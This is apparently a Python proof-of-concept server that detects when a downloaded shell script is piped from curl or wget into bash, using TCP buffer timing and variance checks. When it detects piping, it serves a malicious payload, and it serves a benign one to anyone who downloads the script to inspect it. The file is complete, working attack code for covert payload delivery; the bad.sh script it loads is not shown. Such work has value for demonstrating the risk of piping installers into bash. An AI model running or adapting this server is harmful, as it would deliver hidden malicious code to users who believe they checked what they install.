from numpy import nanstd
import re
import socketserver
import socket
import time
import os


class CurlPipeServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """HTTP server to detect curl | bash"""

    def __init__(self, server_address):
        """Accepts a tuple of (HOST, PORT)"""

        # Socket timeout
        self.socket_timeout = os.getenv("SOCKET_TIMEOUT", 10)

        # Outbound tcp socket buffer size
        self.buffer_size = os.getenv("BUFFER_SIZE", 87380)

        self.max_padding = os.getenv("MAX_PADDING", 32)

        self.scripts_dir = os.getenv("SCRIPTS_DIR", "scripts/")

        # HTTP 200 status code
        self.packet_200 = (
            "HTTP/1.1 200 OK\r\n"
            + "Date: %s\r\n"
            + "Content-Type: text/plain\r\n"
            + "Transfer-Encoding: chunked\r\n"
            + "Connection: keep-alive\r\n\r\n"
        ) % time.ctime(time.time())

        socketserver.TCPServer.__init__(self, server_address, HTTPHandler)
        self.payloads = {}

    def setscript(self, uri, params):
        """Sets parameters for each URI"""

        (null, good, bad, min_jump, max_variance) = params

        null = open(os.path.join(self.scripts_dir, null), "r").read()  # Base file with a delay
        good = open(os.path.join(self.scripts_dir, good), "r").read()  # Non malicious payload
        bad = open(os.path.join(self.scripts_dir, bad), "r").read()  # Malicious payload

        self.payloads[uri] = (null, good, bad, min_jump, max_variance)


class HTTPHandler(socketserver.BaseRequestHandler):
    """Socket handler for MoguiServer"""

    def sendchunk(self, text):
        """Sends a single HTTP chunk"""
        chunk_size = f"{len(text):x}\r\n"
        chunk = f"{chunk_size}{text}\r\n"
        self.request.sendall(chunk.encode())

    def log(self, msg):
        """Writes output to stdout"""

        print(f"[{time.time()}] {self.client_address[0]} {msg}")

    def send_padding(self):
        """Sends a chunk the size of the current TCP buffer filled with padding to the client"""
        padding_chars = "\t"
        padding = padding_chars * self.server.buffer_size

        self.sendchunk(padding)

    def handle(self):
        """Handles inbound TCP connections from MoguiServer"""

        self.log("Inbound request")

        # Setup socket options

        self.request.settimeout(self.server.socket_timeout)
        self.request.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.request.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.server.buffer_size)

        try:
            data = self.request.recv(1024).strip().decode()
        except socket.error:
            self.log("No data received")
            return

        uri = re.search("^GET ([^ ]+) HTTP/1.[0-9]", data)

        if not uri:
            self.log("HTTP request malformed.")
            return

        request_uri = uri[1]
        self.log(f"Request for shell script {request_uri}")

        if request_uri not in self.server.payloads:
            self.log(f"No payload found for {request_uri}")
            return

        # Return 200 status code

        self.request.sendall(self.server.packet_200.encode())

        (payload_plain, payload_good, payload_bad, min_jump, max_var) = self.server.payloads[request_uri]

        # Send plain payload

        self.sendchunk(payload_plain)

        if not re.search("User-Agent: (curl|Wget)", data):
            self.sendchunk(payload_good)
            self.sendchunk("")
            self.log("Request not via wget/curl. Returning good payload.")
            return

        timing = []
        stime = time.time()

        for _ in range(self.server.max_padding):
            self.send_padding()
            timing.append(time.time() - stime)

        # ReLU curve analysis

        max_array = [timing[i + 1] - timing[i] for i in range(len(timing) - 1)]

        jump = max(max_array)

        del max_array[max_array.index(jump)]

        var = nanstd(max_array) ** 2

        self.log(f"Variance = {var}, Maximum Jump = {jump}")
        self.log(f"var < max_var and jump > min_jump: {var} < {max_var} & {jump} > {min_jump}")

        # Payload choice

        if var < max_var and jump > min_jump:
            self.log("Execution through bash detected - sending bad payload :D")
            self.sendchunk(payload_bad)
        else:
            self.log("Sending good payload :(")
            self.sendchunk(payload_good)

        self.sendchunk("")
        self.log("Connection closed.")


def main():
    HOST, PORT = os.getenv("HOST", "0.0.0.0"), int(os.getenv("PORT", 5555))
    SERVER = CurlPipeServer((HOST, PORT))
    SERVER.setscript("/", ("ticker.sh", "good.sh", "bad.sh", 1.0, 0.1))
    SERVER.setscript("/bad", ("ticker.sh", "bad.sh", "bad.sh", 1.0, 0.1))

    print(f"Listening on {HOST} {PORT}")
    SERVER.serve_forever()


if __name__ == "__main__":
    main()
